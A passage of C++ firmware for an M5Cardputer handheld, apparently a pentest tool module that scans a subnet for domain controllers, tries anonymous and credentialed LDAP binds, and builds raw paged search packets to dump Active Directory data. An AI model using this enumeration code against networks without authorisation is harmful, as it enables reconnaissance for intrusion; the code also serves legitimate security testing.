        waitAndReturnToMenu("End of list");
    }
}






/*
  ============================================================================================================================
  // ======== LDAPDump ========
  // inspired by : https://github.com/dirkjanm/ldapdomaindump
  ============================================================================================================================
*/

// =======================
// LDAP UI / LOG CONSOLE
// =======================

// Nombre max de lignes gardÃ©es en mÃ©moire (fixe, pas de new/malloc)
static const int LDAP_LOG_MAX_LINES   = 80;
static const int LDAP_LOG_PAGE_LINES  = 9;  // nb de lignes visibles dans la zone centrale

// Buffer fixe de Strings (pas de std::vector ici)
static String ldapLogLines[LDAP_LOG_MAX_LINES];
static int    ldapLogCount   = 0;   // nb total de lignes valides dans le buffer
static int    ldapLogScroll  = 0;   // index de la 1Ã¨re ligne visible
static bool   ldapLogFollow  = true; // true = auto-scroll vers le bas pendant l'exÃ©

// Contexte pour le header
static IPAddress ldapUiDcIP;
static String    ldapUiBaseDN  = "";
static String    ldapUiPhase   = "IDLE";  // "SCAN", "BIND", "DUMP", etc.

// Dessine le header + contexte (phase, DC, BaseDN)
void ldapUiDrawHeader()
{
  M5.Display.fillScreen(TFT_BLACK);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);

  // Ligne 1 : titre
  M5.Display.setCursor(5, 0);
  M5.Display.println("[ LDAP ENUM / LOG ]");

  // Ligne 2 : DC
  M5.Display.setCursor(5, 10);
  String dcLine = "DC: " + ldapUiDcIP.toString() + "  Phase: " + ldapUiPhase;
  M5.Display.println(dcLine);

  // Ligne 3 : BaseDN (tronquÃ©e si trop longue)
  M5.Display.setCursor(5, 20);
  String dnLine = "BaseDN: " + ldapUiBaseDN;
  if (dnLine.length() > 36) {
    dnLine = dnLine.substring(0, 36);
  }
  M5.Display.println(dnLine);

  // SÃ©parateur
  M5.Display.setCursor(5, 30);
  M5.Display.println("---------------------------");
}

// Redessine la zone de logs + footer Ã  partir de ldapLogScroll
void ldapUiDrawLogs()
{
  // On part aprÃ¨s le header (30 px â‰ˆ 4 lignes)
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(5, 40);

  int total = ldapLogCount;
  if (total < 0) total = 0;

  int first = ldapLogScroll;
  if (first < 0) first = 0;
  if (first > total) first = total;

  int last  = first + LDAP_LOG_PAGE_LINES;
  if (last > total) last = total;

  // Lignes de log
  for (int i = first; i < last; ++i) {
    M5.Display.println(ldapLogLines[i]);
  }

  // Remplir les lignes restantes avec des lignes vides (Ã©viter les artefacts visuels)
  for (int i = last; i < first + LDAP_LOG_PAGE_LINES; ++i) {
    M5.Display.println("");
  }

  // Footer
  M5.Display.println("---------------------------");

  char info[40];
  int page = (LDAP_LOG_PAGE_LINES > 0)
             ? (first / LDAP_LOG_PAGE_LINES) + 1
             : 1;
  snprintf(info, sizeof(info),
           "--- %d/%d lines (Pg %d) ---",
           last, total, page);
  M5.Display.println(info);

  M5.Display.println("[â†‘/W] UP  [â†“/S] DOWN  [ESC] BACK");
}

// Redraw complet (header + logs)
void ldapUiRedraw()
{
  ldapUiDrawHeader();
  ldapUiDrawLogs();
}

void ldapUiResetLog(const IPAddress &dcIP, const String &baseDN)
{
  ldapUiDcIP   = dcIP;
  ldapUiBaseDN = baseDN;
  ldapUiPhase  = "INIT";

  ldapLogCount  = 0;
  ldapLogScroll = 0;
  ldapLogFollow = true;

  ldapUiRedraw();
}

void ldapUiSetPhase(const String &phase)
{
  ldapUiPhase = phase;
  ldapUiRedraw();
}

void ldapUiLogLine(const String &msg)
{
  // Toujours loguer sur le port sÃ©rie pour debug
  Serial.println(msg);

  // Ajout dans le buffer fixe
  if (ldapLogCount < LDAP_LOG_MAX_LINES) {
    ldapLogLines[ldapLogCount] = msg;
    ldapLogCount++;
  } else {
    // DÃ©calage simple (N=80 => coÃ»t raisonnable)
    for (int i = 1; i < LDAP_LOG_MAX_LINES; ++i) {
      ldapLogLines[i - 1] = ldapLogLines[i];
    }
    ldapLogLines[LDAP_LOG_MAX_LINES - 1] = msg;
    // ldapLogCount reste Ã  LDAP_LOG_MAX_LINES
  }

  // Auto-scroll tant quâ€™on est en mode "follow"
  if (ldapLogFollow) {
    if (ldapLogCount > LDAP_LOG_PAGE_LINES) {
      ldapLogScroll = ldapLogCount - LDAP_LOG_PAGE_LINES;
    } else {
      ldapLogScroll = 0;
    }
  }

  // Redraw Ã©cran (header + contenu)
  ldapUiRedraw();
}


void ldapUiShowViewer()
{
  // En mode viewer, on ne suit plus automatiquement le bas
  ldapLogFollow = false;
  ldapUiRedraw();

  while (true) {
    M5Cardputer.update();

    bool up   = M5Cardputer.Keyboard.isKeyPressed(';');
    bool down = M5Cardputer.Keyboard.isKeyPressed('.');
    bool esc  = M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE);

    bool needRedraw = false;

    if (up) {
      if (ldapLogScroll > 0) {
        ldapLogScroll--;
        needRedraw = true;
      }
    } else if (down) {
      int maxStart = max(0, ldapLogCount - LDAP_LOG_PAGE_LINES);
      if (ldapLogScroll < maxStart) {
        ldapLogScroll++;
        needRedraw = true;
      }
    }

    if (needRedraw) {
      ldapUiRedraw();
      delay(80); // simple anti-rebond / limitation de frÃ©quence de redraw
    }

    if (esc) {
      break; // retour
    }

    delay(20);
  }
}

void ldapUiUpdateContext(const IPAddress &dcIP, const String &baseDN)
{
  ldapUiDcIP   = dcIP;
  ldapUiBaseDN = baseDN;
  ldapUiRedraw();   // on ne touche pas au buffer de logs, juste au header
}




// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Globals
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
String ldapDomainDN = "";
String ldapDomainNetbios = "";
String ldapUsername = "";
String ldapPassword = "";

// Gros buffer global pour les rÃ©ponses LDAP (Ã©vite l'overflow de stack)
static const int LDAP_BUF_SIZE = 8192;   // 8 Ko
static uint8_t ldapRespBuf[LDAP_BUF_SIZE];  // allouÃ© en .bss, pas sur la stack

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Sanitize LDAP strings â†’ keep only printable chars
// and escape HTML entities.
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
String sanitizeLDAPString(const uint8_t* data, int len)
{
    String out = "";
    out.reserve(len); // optimisation ESP32

    for (int i = 0; i < len; i++)
    {
        uint8_t c = data[i];

        // ASCII printable?
        if (c >= 32 && c <= 126)
        {
            // Escape HTML specials
            if (c == '<')      out += "&lt;";
            else if (c == '>') out += "&gt;";
            else if (c == '&') out += "&amp;";
            else               out += (char)c;
        }
        // allow TAB and CR/LF just in case
        else if (c == '\t' || c == '\n' || c == '\r')
        {
            out += ' ';
        }
        // ignore everything else (binary / ASN.1)
    }

    return out;
}



// Construit un UPN user@domain.tld Ã  partir de ldapDomainDN si besoin
String ldapNormalizeUsername(const String &rawUser)
{
    // Si dÃ©jÃ  au format user@domain.tld ou DOMAIN\user â†’ on ne touche pas
    if (rawUser.indexOf('@') != -1 || rawUser.indexOf('\\') != -1) {
        return rawUser;
    }

    // Si on n'a pas encore de DN de domaine â†’ on ne fait rien
    if (ldapDomainDN.length() == 0) {
        return rawUser;
    }

    // Construire le FQDN Ã  partir du DN : DC=asg,DC=net -> asg.net
    String fqdn = "";
    int pos = 0;
    while (true) {
        int idx = ldapDomainDN.indexOf("DC=", pos);
        if (idx < 0) break;
        int end = ldapDomainDN.indexOf(',', idx);
        if (end < 0) end = ldapDomainDN.length();
        String dc = ldapDomainDN.substring(idx + 3, end);
        if (fqdn.length() > 0) fqdn += ".";
        fqdn += dc;
        pos = end + 1;
    }

    if (fqdn.length() == 0) {
        // DN bizarre ? On ne modifie pas lâ€™utilisateur
        return rawUser;
    }

    return rawUser + "@" + fqdn;
}

bool extractAttributeValue(
    const uint8_t* buf, int len,
    const char* attrName,
    String& out
){
    out = "";
    int pos = 0;

    // buf = SEQUENCE d'attributs (PartialAttribute)
    while (pos < len)
    {
        uint8_t tag;
        int vlen;
        const uint8_t* val;

        // Lire un TLV (on espÃ¨re un PartialAttribute = SEQUENCE 0x30)
        if (!readTLV(buf, len, pos, tag, vlen, val))
            break;

        if (tag != 0x30) {
            // pas un PartialAttribute, on skip
            continue;
        }

        // Ã€ l'intÃ©rieur : type (OCTET STRING) + vals (SET OF)
        int p2 = 0;
        uint8_t t2;
        int l2;
        const uint8_t* v2;

        // type (nom d'attribut)
        if (!readTLV(val, vlen, p2, t2, l2, v2))
            continue;
        if (t2 != 0x04)
            continue;

        String name = "";
        for (int i = 0; i < l2; i++)
            name += (char)v2[i];

        if (!name.equalsIgnoreCase(attrName)) {
            // ce n'est pas l'attribut qu'on cherche â†’ on passe au suivant
            continue;
        }

        // vals (SET OF)
        if (!readTLV(val, vlen, p2, t2, l2, v2))
            return false;
        if (t2 != 0x31)   // SET OF
            return false;

        // PremiÃ¨re valeur dans le SET
        int p3 = 0;
        uint8_t t3;
        int l3;
        const uint8_t* v3;

        if (!readTLV(v2, l2, p3, t3, l3, v3))
            return false;
        if (t3 != 0x04)   // OCTET STRING
            return false;

        out = sanitizeLDAPString(v3, l3);
        return true;
    }

    return false;
}




//-----------------------------------------------------------------------------

// Encode un filtre simple du type "attribut=valeur" en equalityMatch ASN.1
// Si pas de "=", on tombe en filtre "present" (objectClass, etc.).
void encodeLDAPFilter(
    uint8_t* pkt,
    int& p,
    const String& filter
){
    int eq = filter.indexOf('=');

    // Pas de "=", on encode un filtre "present" : (attr=*)
    if (eq <= 0 || eq >= filter.length() - 1) {
        // present : [7] 0x87 + len + "attr"
        String attr = filter;
        attr.trim();

        pkt[p++] = 0x87;
        pkt[p++] = attr.length();
        memcpy(&pkt[p], attr.c_str(), attr.length());
        p += attr.length();
        return;
    }

    // SÃ©paration "attribut=valeur"
    String attr = filter.substring(0, eq);
    String val  = filter.substring(eq + 1);
    attr.trim();
    val.trim();

    // equalityMatch : [3] 0xA3
    pkt[p++] = 0xA3;
    int lenPos = p++;   // longueur de la SEQUENCE Ã  remplir plus tard

    // attributeDesc (OCTET STRING)
    pkt[p++] = 0x04;
    pkt[p++] = attr.length();
    memcpy(&pkt[p], attr.c_str(), attr.length());
    p += attr.length();

    // assertionValue (OCTET STRING)
    pkt[p++] = 0x04;
    pkt[p++] = val.length();
    memcpy(&pkt[p], val.c_str(), val.length());
    p += val.length();

    // Fixer la longueur de la sÃ©quence equalityMatch
    pkt[lenPos] = p - lenPos - 1;
}





// Debug : parse rapide du paquet LDAP qu'on ENVOIE
void debugLDAPRequestStructure(const uint8_t* pkt, int len) {
    //Serial.printf("[LDAP][DEBUG] Request PDU len=%d\n", len);

    int pos = 0;
    uint8_t tag;
    int vlen;
    const uint8_t* val;

    // LDAPMessage ::= SEQUENCE
    if (!readTLV(pkt, len, pos, tag, vlen, val)) {
        //Serial.println("[LDAP][DEBUG] readTLV(top) FAILED");
        return;
    }
    //Serial.printf("[LDAP][DEBUG] top tag=0x%02X len=%d (expect 0x30)\n", tag, vlen);

    int mPos = 0;
    uint8_t t;
    int l;
    const uint8_t* v;

    // messageID (INTEGER)
    if (!readTLV(val, vlen, mPos, t, l, v)) {
        //Serial.println("[LDAP][DEBUG] cannot read messageID");
        return;
    }
    int msgId = 0;
    if (t == 0x02) {
        for (int i = 0; i < l; i++) msgId = (msgId << 8) | v[i];
        //Serial.printf("[LDAP][DEBUG] messageID tag=0x%02X len=%d value=%d\n", t, l, msgId);
    } else {
        //Serial.printf("[LDAP][DEBUG] messageID tag unexpected: 0x%02X len=%d\n", t, l);
    }

    // protocolOp (searchRequest attendu â†’ 0x63)
    if (!readTLV(val, vlen, mPos, t, l, v)) {
        //Serial.println("[LDAP][DEBUG] cannot read protocolOp");
        return;
    }
    //Serial.printf("[LDAP][DEBUG] protocolOp tag=0x%02X len=%d (expect 0x63)\n", t, l);

    // S'il reste des donnÃ©es : potentiellement Controls [0] (0xA0)
    if (mPos < vlen) {
        uint8_t t2;
        int l2;
        const uint8_t* v2;
        if (!readTLV(val, vlen, mPos, t2, l2, v2)) {
            //Serial.println("[LDAP][DEBUG] cannot read next element after protocolOp");
            return;
        }
        //Serial.printf("[LDAP][DEBUG] next element tag=0x%02X len=%d (expect 0xA0 for Controls)\n", t2, l2);
    } else {
        //Serial.println("[LDAP][DEBUG] No extra element after protocolOp (no Controls?)");
    }
}



int buildLDAPSearchPaged(
    uint8_t *pkt,
    int maxLen,
    const char *baseDN,
    const char *filter,
    const char **attrs,
    int attrCount,
    int pageSize,
    const uint8_t *cookie,
    int cookieLen
) {
    int p = 0;

    //Serial.println(F("[LDAP][DEBUG] buildLDAPSearchPaged() START"));
    /*Serial.printf("[LDAP][DEBUG] baseDN='%s' filter='%s' pageSize=%d cookieLen=%d\n",
                  baseDN ? baseDN : "(null)",
                  filter ? filter : "(null)",
                  pageSize,
                  cookieLen);*/

    if (!pkt || maxLen < 64) {
        //Serial.println(F("[LDAP][DEBUG] ERROR: buffer too small"));
        return 0;
    }

    String baseStr   = baseDN  ? String(baseDN)  : String("");
    String filterStr = filter  ? String(filter)  : String("");

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // LDAPMessage ::= SEQUENCE { messageID, protocolOp, [0] Controls OPTIONAL }
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    pkt[p++] = 0x30;              // SEQUENCE
    int ldapLenPos      = p++;    // longueur Ã  corriger plus tard
    int ldapContentStart = p;

    // messageID = 5 (arbitraire mais non nul)
    pkt[p++] = 0x02; pkt[p++] = 0x01; pkt[p++] = 0x05;

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // searchRequest [APPLICATION 3]
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    pkt[p++] = 0x63;              // searchRequest
    int srLenPos       = p++;     // longueur SearchRequest Ã  corriger
    int srContentStart = p;

    // baseObject (LDAPDN)
    uint8_t dnLen = baseStr.length();
    if (p + 2 + dnLen > maxLen) {
        //Serial.println(F("[LDAP][DEBUG] ERROR: buffer overflow on baseDN"));
        return 0;
    }
    pkt[p++] = 0x04;              // OCTET STRING
    pkt[p++] = dnLen;
    memcpy(pkt + p, baseStr.c_str(), dnLen);
    p += dnLen;

    // scope: wholeSubtree (2)
    pkt[p++] = 0x0A; pkt[p++] = 0x01; pkt[p++] = 0x02;
    // derefAliases: never (0)
    pkt[p++] = 0x0A; pkt[p++] = 0x01; pkt[p++] = 0x00;
    // sizeLimit = 0
    pkt[p++] = 0x02; pkt[p++] = 0x01; pkt[p++] = 0x00;
    // timeLimit = 0
    pkt[p++] = 0x02; pkt[p++] = 0x01; pkt[p++] = 0x00;
    // typesOnly = FALSE
    pkt[p++] = 0x01; pkt[p++] = 0x01; pkt[p++] = 0x00;

    // Filtre (attr=value) ou present
    encodeLDAPFilter(pkt, p, filterStr);
    //Serial.printf("[LDAP][DEBUG] Filter encoded, offset=%d\n", p - srContentStart);

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Attributes : SEQUENCE OF AttributeDescription
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    pkt[p++] = 0x30;               // SEQUENCE
    int attrSeqLenPos = p++;       // longueur Ã  corriger
    int usedAttrs = attrCount;
    if (usedAttrs < 0) usedAttrs = 0;
    if (usedAttrs > 16) usedAttrs = 16;

    for (int i = 0; i < usedAttrs; ++i) {
        const char *a = attrs[i];
        if (!a) continue;
        int alen = strlen(a);
        pkt[p++] = 0x04;           // OCTET STRING
        pkt[p++] = alen;
        memcpy(pkt + p, a, alen);
        p += alen;
    }

    // Longueur de la SEQUENCE d'attributs (peut rester en forme courte)
    {
        int attrContentLen = p - (attrSeqLenPos + 1);
        int bytes = encodeSeqLength(pkt, attrSeqLenPos, attrContentLen);
        p += (bytes - 1);
    }

    // Longueur du searchRequest (Ã  ce stade il n'y a PAS encore de Controls)
    {
        int srContentLen = p - srContentStart;
        int bytes = encodeSeqLength(pkt, srLenPos, srContentLen);
        p += (bytes - 1);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Controls [0] â€“ PagedResultsControl
    // (en dehors du searchRequest, au niveau de LDAPMessage)
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    pkt[p++] = 0xA0;               // [0] Controls
    int ctrlSeqLenPos = p++;
    int ctrlStart     = p;

    // Control ::= SEQUENCE { controlType, criticality, controlValue }
    pkt[p++] = 0x30;
    int ctrlInnerLenPos = p++;
    int ctrlInnerStart  = p;

    // controlType OID (paging)
    const char *oid = "1.2.840.113556.1.4.319";
    int oidLen = strlen(oid);
    pkt[p++] = 0x04; pkt[p++] = oidLen;
    memcpy(pkt + p, oid, oidLen);
    p += oidLen;

    // criticality = TRUE (on peut mettre FALSE aussi, mais TRUE est OK)
    pkt[p++] = 0x01; pkt[p++] = 0x01; pkt[p++] = 0x01;

    // controlValue = OCTET STRING contenant :
    //   SEQUENCE { pageSize INTEGER, cookie OCTET STRING }
    pkt[p++] = 0x04;
    int cvLenPos = p++;
    int cvStart  = p;

    // SEQUENCE Ã  l'intÃ©rieur de controlValue
    pkt[p++] = 0x30;
    int cvSeqLenPos = p++;
    int cvSeqStart  = p;

    // pageSize INTEGER
    pkt[p++] = 0x02;
    pkt[p++] = 0x01;
    pkt[p++] = (uint8_t)pageSize;

    // cookie OCTET STRING (avec longueur en forme courte ou longue)
    pkt[p++] = 0x04;
    if (cookieLen < 0x80) {
        pkt[p++] = (uint8_t)cookieLen;
    } else if (cookieLen <= 0xFF) {
        pkt[p++] = 0x81;
        pkt[p++] = (uint8_t)cookieLen;
    } else {
        pkt[p++] = 0x82;
        pkt[p++] = (uint8_t)((cookieLen >> 8) & 0xFF);
        pkt[p++] = (uint8_t)(cookieLen & 0xFF);
    }

    if (cookieLen > 0) {
        memcpy(pkt + p, cookie, cookieLen);
        p += cookieLen;
    }

    // Longueur de la SEQUENCE interne dans controlValue
    {
        int contentLen = p - cvSeqStart;
        int bytes = encodeSeqLength(pkt, cvSeqLenPos, contentLen);
        p += (bytes - 1);
    }

    // Longueur de l'OCTET STRING controlValue
    {
        int contentLen = p - cvStart;
        int bytes = encodeSeqLength(pkt, cvLenPos, contentLen);
        p += (bytes - 1);
    }

    // Longueur du Control SEQUENCE
    {
        int contentLen = p - ctrlInnerStart;
        int bytes = encodeSeqLength(pkt, ctrlInnerLenPos, contentLen);
        p += (bytes - 1);
    }

    // Longueur de Controls [0]
    {
        int contentLen = p - ctrlStart;
        int bytes = encodeSeqLength(pkt, ctrlSeqLenPos, contentLen);
        p += (bytes - 1);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Longueur globale de LDAPMessage
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    int ldapContentLen = p - ldapContentStart;
    {
        int bytes = encodeSeqLength(pkt, ldapLenPos, ldapContentLen);
        p += (bytes - 1);
    }

    //Serial.printf("[LDAP][DEBUG] Total packet len=%d (contentLen=%d)\n", p, ldapContentLen);
    //Serial.println(F("[LDAP][DEBUG] buildLDAPSearchPaged() END"));

    return p;
}



// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Simple LDAP bind
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
bool ldapBind(WiFiClient& client, const String& user = "", const String& pass = "") {
    uint8_t pkt[256];
    int p = 0;

    pkt[p++] = 0x30;   // SEQUENCE
    int lenPos = p++;

    pkt[p++] = 0x02; pkt[p++] = 0x01; pkt[p++] = 0x01;   // messageID = 1
    pkt[p++] = 0x60;   // bindRequest
    int bindLenPos = p++;

    pkt[p++] = 0x02; pkt[p++] = 0x01; pkt[p++] = 0x03;   // version = 3

    // username
    pkt[p++] = 0x04; pkt[p++] = user.length();
    for (int i = 0; i < user.length(); ++i) pkt[p++] = user[i];

    // password
    pkt[p++] = 0x80; pkt[p++] = pass.length();
    for (int i = 0; i < pass.length(); ++i) pkt[p++] = pass[i];

    // fix lengths
    pkt[bindLenPos] = p - bindLenPos - 1;
    pkt[lenPos]     = p - lenPos - 1;

    client.write(pkt, p);
    delay(150);

    uint8_t resp[128];
    int len = client.read(resp, sizeof(resp));

    if (len < 8) {
        client.stop();
        return false;
    }

    // success == bindResponse(0x61) + resultCode = 0x00
    for (int i = 0; i < len - 3; ++i) {
        if (resp[i] == 0x61 && resp[i+2] == 0x00 && resp[i+3] == 0x00) {
            return true;
        }
    }

    client.stop();
    return false;
}

bool detectAndBindToDC(IPAddress &dcIP)
{
    Serial.println();
    Serial.println("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
    Serial.println("[LDAP] START detectAndBindToDC()");
    Serial.println("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");

    // === Step 1 â€” Ask user for /24 or IP ===
    M5.Display.clear();
    M5.Display.setCursor(5, 0);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.println("Enter /24 or IP:");
    IPAddress local = WiFi.localIP();
    M5.Display.print("Current : ");
    M5.Display.println(local.toString());    
    enterDebounce();

    String netInput = getUserInput("NET or IP:");
    netInput.trim();
    Serial.println("[INPUT] User typed: " + netInput);

    if (netInput.length() < 7 || netInput.indexOf('.') == -1)
    {
        Serial.println("[ERROR] Invalid IP or /24 format.");
        waitAndReturnToMenu("Invalid IP");
        return false;
    }

    // Compter les points â†’ 3 = IP complÃ¨te
    int dotCount = 0;
    for (char c : netInput) if (c == '.') dotCount++;

    bool isSingleIP = (dotCount == 3);
    bool foundHosts = false;
    std::vector<IPAddress> hosts;

    // === Step 1.5 â€” Common network info ===
    IPAddress subnet = WiFi.subnetMask();
    Serial.println("[INFO] Local IP : " + local.toString());
    Serial.println("[INFO] Netmask  : " + subnet.toString());

    // Initialiser console UI
    ldapUiResetLog(IPAddress(0,0,0,0), "");
    ldapUiSetPhase("SCAN");

    if (isSingleIP){
        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        // MODE IP DIRECTE
        // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if (!dcIP.fromString(netInput)) {
            Serial.println("[ERROR] Invalid IP format");
            ldapUiLogLine("[ERROR] Invalid IP format");
            waitAndReturnToMenu("Invalid IP");
            return false;
        }

        ldapUiLogLine("[MODE] Direct IP: " + dcIP.toString());

        // Test simple bind (juste pour valider la prÃ©sence LDAP)
        WiFiClient c;
        bool reachable = false;
        if (c.connect(dcIP, 389)) {
            ldapUiLogLine("[TEST] Checking LDAP port...");
            if (ldapBind(c, "", "")) {
                ldapUiLogLine("[TEST] Simple bind OK");
                 // ðŸ”¥ Ajoute Ã§a : rÃ©cupÃ©rer tout de suite le defaultNamingContext
                if (getDefaultNamingContext(c)) {
                    ldapUiLogLine("[RootDSE] BaseDN = " + ldapDomainDN);
                    ldapUiUpdateContext(dcIP, ldapDomainDN);
                } else {
                    ldapUiLogLine("[WARN] RootDSE query failed â€” BaseDN unknown");
                }
                reachable = true;
            } else {
                ldapUiLogLine("[WARN] Simple bind failed (still continuing)");
            }
            c.stop();
        }

        if (!reachable) {
            ldapUiLogLine("[ERROR] LDAP service not responding");
            Serial.println("[LDAP] No response from DC IP");
        }

        // === Toujours demander les identifiants ===
        enterDebounce();
        M5.Display.clear();
        M5.Display.setCursor(5, 0);
        M5.Display.setTextSize(1.5);
        M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        M5.Display.println("AD Login:");
        String rawUser = getUserInput("AD Login:");
        ldapUsername = ldapNormalizeUsername(rawUser);
        ldapUiLogLine("[AUTH] Login: " + ldapUsername);
        enterDebounce();
        M5.Display.clear();
        M5.Display.setCursor(5, 0);
        M5.Display.setTextSize(1.5);
        M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        M5.Display.println("AD Password:");
        ldapPassword = getUserInput("AD Password:");

        ldapUiLogLine("[AUTH] Trying authenticated bind...");
        WiFiClient cli;
        if (!cli.connect(dcIP, 389))
        {
            ldapUiLogLine("[ERROR] TCP connect failed");
            return false;
        }

        bool ok = ldapBind(cli, ldapUsername, ldapPassword);
        if (ok){
          // On reste connectÃ© pour interroger RootDSE
          if (getDefaultNamingContext(cli)){
              ldapUiLogLine("[RootDSE] BaseDN = " + ldapDomainDN);
              ldapUiUpdateContext(dcIP, ldapDomainDN);
          } else {
              ldapUiLogLine("[WARN] RootDSE query failed â€” BaseDN unknown");
          }
        }
        cli.stop();
        ldapUiLogLine(ok ? "[AUTH] SUCCESS" : "[AUTH] FAILED");
        return ok;
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // MODE /24 NETWORK SCAN
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    String baseStr = netInput + ".";
    char base_ip[16];
    memset(base_ip, 0, sizeof(base_ip));
    baseStr.toCharArray(base_ip, sizeof(base_ip));

    uint8_t o1, o2, o3;
    sscanf(base_ip, "%hhu.%hhu.%hhu.", &o1, &o2, &o3);

    ldapUiLogLine("[SCAN] Network: " + baseStr + "0-254");
    bool sameSubnet =
        ((local[0] & subnet[0]) == (o1 & subnet[0])) &&
        ((local[1] & subnet[1]) == (o2 & subnet[1])) &&
        ((local[2] & subnet[2]) == (o3 & subnet[2]));

    ldapUiLogLine(String("[SCAN] Mode: ") + (sameSubnet ? "ARP" : "TCP"));
